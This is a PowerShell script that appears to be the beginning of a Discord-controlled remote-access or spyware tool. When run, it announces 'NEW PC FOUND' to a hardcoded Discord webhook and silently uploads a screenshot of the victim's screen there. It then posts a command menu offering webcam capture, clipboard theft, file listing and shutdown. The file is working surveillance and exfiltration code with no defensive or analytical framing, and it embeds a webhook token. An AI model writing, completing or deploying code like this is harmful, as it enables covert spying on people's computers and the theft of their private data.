# --- CONFIG ---
$WEBHOOK_URL = "https://discord.com/api/webhooks/1412041332255363173/YFAS1O5EU4UB-qv_qvbFQfsktXiRQ7uXWebXqVhkF_yHKvPtJEpBmiHpCjQJ0SEVVwCM"  # Replace with your webhook

# Commands menu
$COMMANDS = @(
    "Open Calculator",
    "List Files",
    "Take Screenshot",
    "Capture Webcam",
    "Send Clipboard",
    "Run Malware Scan",
    "Shutdown"
)

# --- Helper functions ---
function Send-Embed {
    param(
        [string]$Title,
        [string]$Description,
        [array]$Fields
    )

    $embed = @{
        title       = $Title
        description = $Description
        color       = 16711680  # Red
    }

    if ($Fields) {
        $embed["fields"] = $Fields
    }

    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 4
    Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $body -ContentType "application/json"
}

function Send-Screenshot {
    # Take screenshot
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $filePath = "$env:TEMP\screenshot.png"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)

    # Send to webhook
    Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -InFile $filePath -ContentType "multipart/form-data" -Form @{ file = Get-Item $filePath }
    
    Remove-Item $filePath
}

# --- Main ---
# Send "NEW PC FOUND" embed
Send-Embed -Title "🚨 NEW PC FOUND 🚨" -Description "A new device has connected."

# Send screenshot
Send-Screenshot

# Send commands menu
$fields = @()
foreach ($cmd in $COMMANDS) {
    $fields += @{ name = $cmd; value = "Click to execute" }
}
Send-Embed -Title "💻 Available Commands" -Description "Select a command to run." -Fields $fields
